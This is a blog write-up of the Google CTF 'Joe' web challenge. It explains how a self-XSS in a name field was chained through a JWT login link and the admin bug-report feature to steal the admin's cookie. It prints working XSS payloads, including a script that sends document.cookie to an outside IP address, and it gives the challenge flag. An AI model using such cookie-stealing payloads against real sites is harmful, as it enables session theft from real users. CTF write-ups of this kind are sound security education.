---
published: true
---
## Joe Challange writeup: Google ctf

Joe was the first of five puzzles in the Web category, and the only one classified as Easy. In essence, the challenge entailed the following:

_If you can find a vulnerability that makes it possible to steal the cookies of the administrator, we will reward you with a valuable flag:_

[Challenge url](https://joe.web.ctfcompetition.com)

![Joe_screenshot.png]({{site.baseurl}}/_posts/Joe_screenshot.png)

Initial reconnaissance led me to the following features.


- Name-changing
- Session and Login handling
- Submitting bug report to admin.

Another interesting point was that if we try to use the link provided for admin login then we getting the following result.

![joe_admin_login.png]({{site.baseurl}}/_posts/joe_admin_login.png)



As we can see in the above responce that the admin have a cookie named as flag and it's required for logging in as an admin. Now we just need to figure out a way to steal the admin cookie.

Cookie theft is often facilitated through XSS (cross-site scripting), so I asked Joe to let me rename you to an injection payload:

**<svg/onload=alert(document.domain)>**


Refreshing the page led to successful self XSS
![joe_test.png]({{site.baseurl}}/_posts/joe_test.png)


But this payload is executing in self context a.k.a. "selfxss".Now I proceeded to focus on leveraging this against the "administrator" user. Reporting a bug to admin seems an intersting attack surface for this purpose. we can use this feature to report a bug by supplying a valid report URL (prefixed with HTTP/S) and CAPTCHA response.


But after trying a few times I am still not able to exploit this feature. So i decided to take a look on the login feature. where i found [JSON Web Token](https://jwt.io/) parameter in a login request:

![Screenshot from 2017-07-03 15-57-08.png]({{site.baseurl}}/_posts/Screenshot from 2017-07-03 15-57-08.png)



**_JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object._**



I found that the above URL could be used to log into my account with a valid JWT, and proceeded to change Joe's name to the following payload

**<script>img = new Image(); img.src="https://139.59.74.204/cookie?q="+document.cookie;alert("done");</script>**

![selfxss.png]({{site.baseurl}}/_posts/selfxss.png)

As you can see in above image that the payload executed successfully. Now all i need is to issue a bug report for admin and sent my tokenised URL to Joe, but this url was rejected due to excess length.


![joe_url_too_big.png]({{site.baseurl}}/_posts/joe_url_too_big.png)

So i used google's link shortner service and sent the new url as a bug report. Which is get accepted successfully.

![Screenshot from 2017-07-03 15-59-36.png]({{site.baseurl}}/_posts/Screenshot from 2017-07-03 15-59-36.png)

Now all i needed is to check the access log of apache that is running on my VPS.
![joe_flag.png]({{site.baseurl}}/_posts/joe_flag.png)

And this way i got the access of admin's flag cookie.

		flag=CTF{h1-j03-c4n-1-h4v3-4-c00k13-plz!?!};
